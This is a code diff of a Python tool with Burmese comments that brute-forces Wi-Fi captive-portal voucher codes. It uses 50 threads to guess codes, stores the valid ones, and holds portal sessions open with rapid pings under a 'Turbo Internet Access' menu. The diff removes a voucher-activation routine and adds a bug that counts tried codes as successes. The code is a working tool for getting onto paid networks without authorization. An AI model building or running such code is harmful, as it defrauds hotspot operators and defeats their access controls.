@@ -15,9 +15,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # --- CONFIGURATION ---
 SUCCESS_CODES_FILE = "success.txt"
 TRIED_CODES_FILE = "tried.txt"
-VOUCHER_THREADS = 50 # Voucher ရှာမည့် Thread အရေအတွက်
-PING_THREADS = 5 # Internet မြှင့်တင်မည့် Thread အရေအတွက်
-PING_INTERVAL = 0.1 # Pinging ကြားကာလ (Turbo)
+VOUCHER_THREADS = 50 # Threads အရေအတွက်
+PING_INTERVAL = 1 # Ping ထိုးမည့် ကြားကာလ
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -70,7 +69,7 @@ def get_session_id(session, portal_url):
     except:
         return None
 
-# --- MENU 1: TEST CODE + CONNECT ---
+# --- MENU 1: TEST SPECIFIC CODE ---
 def test_specific_code():
     code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
     print(f"\n🔍 စမ်းသပ်နေသည်: {code_to_test} ...")
@@ -96,7 +95,6 @@ def test_specific_code():
             print(f"\n\033[92m✅ SUCCESS! Valid Code: {code_to_test}\033[0m")
             with open(SUCCESS_CODES_FILE, "a") as f:
                 f.write(f"{code_to_test}\n")
-            print("📡 Internet ချိတ်ဆက်မှု အောင်မြင်သည်။")
         else:
             print(f"\n❌ FAIL! Invalid Code: {code_to_test}")
             
@@ -194,33 +192,7 @@ def turbo_internet_access():
         
     print(f"📡 Session Found: {sid}")
 
-    # 2. Code သုံးပြီး Activation
-    if not os.path.exists(SUCCESS_CODES_FILE):
-        print("❌ Success Codes များမရှိပါ။ Menu 2 ဖြင့် အရင်ရှာပါ။")
-        time.sleep(2)
-        return
-
-    with open(SUCCESS_CODES_FILE, "r") as f:
-        codes = [line.strip() for line in f.readlines() if line.strip()]
-        if not codes:
-            print("❌ Success Codes များမရှိပါ။")
-            time.sleep(2)
-            return
-        code = codes[-1] # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
-
-    print(f"📡 သုံးစွဲမည့် Code: {code}")
-    voucher_api = f"{portal_host}/api/auth/voucher/"
-    
-    try:
-        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
-            print(f"\033[92m✅ SUCCESS! Voucher Activated.\033[0m")
-        else:
-            print(f"❌ Voucher Activation Failed.")
-    except Exception as e:
-        print(f"❌ Error during activation: {e}")
-
-    # 3. Turbo Pinging Threads များ (Your script logic)
+    # 2. Turbo Pinging Threads များ (Your script logic)
     parsed_portal = urlparse(portal_url)
     params = parse_qs(parsed_portal.query)
     gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
@@ -235,10 +207,10 @@ def turbo_internet_access():
                 print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: OK)   ", end='\r')
             except:
                 print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: ERROR)", end='\r')
-            time.sleep(PING_INTERVAL)
+            time.sleep(0.1) # TURBO INTERVAL
 
-    print(f"[*] Starting {PING_THREADS} Turbo Pinging Threads...")
-    for _ in range(PING_THREADS):
+    print(f"[*] Starting Turbo Pinging Threads...")
+    for _ in range(5): # 5 Threads
         threading.Thread(target=high_speed_ping, daemon=True).start()
 
     # Internet လိုင်းတောက်လျှောက်ရနေအောင် ထိန်းထားခြင်း
@@ -260,7 +232,7 @@ def show_menu():
     
     success_count = 0
     if os.path.exists(SUCCESS_CODES_FILE):
-        with open(SUCCESS_CODES_FILE, "r") as f:
+        with open(TRIED_CODES_FILE, "r") as f:
             success_count = len(f.readlines())
 
     print("========================================")
@@ -268,8 +240,8 @@ def show_menu():
     print("========================================")
     print(f"📊 စမ်းသပ်ပြီး: {tried_count} | 🎯 အောင်မြင်: {success_count}")
     print("========================================")
-    print("1. 🔍 Test Code + Internet")
-    print("2. 🚀 Fast Harvesting")
+    print("1. 🔍 Test Specific Code")
+    print("2. 🚀 Fast Random Harvesting")
     print("3. 📋 View Success Codes")
     print("4. 🔄 Reset Data (Start Over)")
     print("5. 🌐 Turbo Internet Access")
